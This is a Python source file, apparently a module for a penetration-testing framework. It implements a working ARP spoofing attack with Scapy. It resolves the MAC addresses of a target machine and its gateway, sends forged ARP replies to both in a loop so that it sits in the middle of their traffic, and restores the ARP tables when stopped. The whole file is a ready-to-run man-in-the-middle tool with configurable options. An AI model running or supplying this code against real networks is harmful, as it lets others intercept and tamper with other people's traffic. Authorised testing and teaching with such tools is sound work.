import time
from core.base_module import BaseModule
from rich.console import Console

# Scapy can be a bit noisy on import
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

try:
    from scapy.all import ARP, Ether, srp, send
except ImportError:
    # This allows the module to be listed even if scapy is not installed
    pass

class ArpSpoofer(BaseModule):
    """Performs an ARP spoofing attack to become Man-in-the-Middle."""

    def get_options(self):
        """
        Returns the options for this module.
        """
        return {
            'TARGET_IP': ['', 'The IP address of the target machine.'],
            'GATEWAY_IP': ['', 'The IP address of the gateway/router.'],
            'PACKET_COUNT': [10, 'The number of spoofing packets to send (0 for infinite).']
        }

    def _get_mac(self, ip, console):
        """Gets the MAC address for a given IP."""
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        if answered_list:
            return answered_list[0][1].hwsrc
        return None

    def _spoof(self, target_ip, target_mac, spoof_ip):
        """Sends a single spoofed ARP packet."""
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(packet, verbose=False)

    def _restore(self, dest_ip, dest_mac, src_ip, src_mac):
        """Restores the ARP table."""
        packet = ARP(op=2, hwdst=dest_mac, pdst=dest_ip, hwsrc=src_mac, psrc=src_ip)
        send(packet, count=4, verbose=False)

    def run(self, options):
        """
        Executes the ARP spoofing attack.
        """
        target_ip = options.get('TARGET_IP')
        gateway_ip = options.get('GATEWAY_IP')
        packet_count = int(options.get('PACKET_COUNT'))
        console = Console()

        if not all([target_ip, gateway_ip]):
            console.print("[!] TARGET_IP and GATEWAY_IP must be set.", style="bold red")
            return

        try:
            console.print("[*] Resolving MAC addresses...")
            target_mac = self._get_mac(target_ip, console)
            gateway_mac = self._get_mac(gateway_ip, console)

            if not target_mac or not gateway_mac:
                console.print("[!] Could not resolve MAC address for target or gateway.", style="bold red")
                return
            
            console.print(f"[+] Target: {target_ip} at {target_mac}")
            console.print(f"[+] Gateway: {gateway_ip} at {gateway_mac}")
            
            console.print("[*] Starting ARP spoofing... Press Ctrl+C to stop and restore.")
            sent_packets = 0
            while True:
                self._spoof(target_ip, target_mac, gateway_ip)
                self._spoof(gateway_ip, gateway_mac, target_ip)
                sent_packets += 2
                console.print(f"\r[*] Packets sent: {sent_packets}", end="")
                time.sleep(2)
                if packet_count != 0 and sent_packets >= packet_count:
                    break

        except KeyboardInterrupt:
            console.print("\n[*] Detected Ctrl+C... Restoring ARP tables.")
        except Exception as e:
            console.print(f"\n[!] An error occurred: {e}", style="bold red")
        finally:
            if 'target_mac' in locals() and 'gateway_mac' in locals() and target_mac and gateway_mac:
                self._restore(gateway_ip, gateway_mac, target_ip, target_mac)
                self._restore(target_ip, target_mac, gateway_ip, gateway_mac)
                console.print("[+] ARP tables restored.")
